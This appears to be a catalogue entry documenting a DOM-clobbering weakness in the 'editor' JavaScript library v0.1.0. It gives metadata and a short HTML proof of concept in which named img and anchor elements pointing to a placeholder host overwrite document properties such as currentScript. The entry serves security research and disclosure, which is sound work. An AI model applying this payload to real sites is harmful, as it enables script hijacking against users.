## editor

### Meta

+ Library: editor
+ Version: v0.1.0
+ Stars: 2.8K
+ Fingerprint: N/A
+ Input: Type
+ Sanitizer: N/A
+ Capability: Any named property
+ CVE: N/A
+ Status: N/A

### Library

https://github.com/lepture/editor
http://lab.lepture.com/editor/

### Vulnerable Code Snippet

N/A

### PoC 

```html
<!--Library-->
<link rel="stylesheet" href="//cdn.jsdelivr.net/editor/0.1.0/editor.css">
<script src="//cdn.jsdelivr.net/editor/0.1.0/editor.js"></script>
<script src="//cdn.jsdelivr.net/editor/0.1.0/marked.js"></script>
<textarea></textarea>
<script>
var editor = new Editor();
editor.render();
</script>
<!--Library-->


<!--Payload-->
<img name="currentScript" src="https://xxx.xxx.xxx">
<img name="attack" src="https://xxx.xxx.xxx">
<a name="attack" href="https://xxx.xxx.xxx">AAA</a>
<p>Type the following rendered HTML elements to the editor and check the editor in the debugging console: `editor.codemirror.getValue();`.</p>
<!--Payload-->
```